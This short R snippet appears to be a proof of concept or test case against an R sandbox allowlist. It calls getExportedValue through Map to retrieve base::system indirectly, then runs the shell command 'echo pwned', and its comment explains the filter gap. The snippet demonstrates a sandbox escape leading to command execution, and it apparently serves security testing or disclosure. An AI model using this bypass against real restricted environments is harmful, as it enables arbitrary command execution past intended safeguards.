# getExportedValue was neither allowlisted nor blocked; passed as a value it returns
# the real base::system.
tmp <- Map(getExportedValue, "base", "system")
sysfn <- tmp[[1]]
Map(sysfn, "echo pwned")
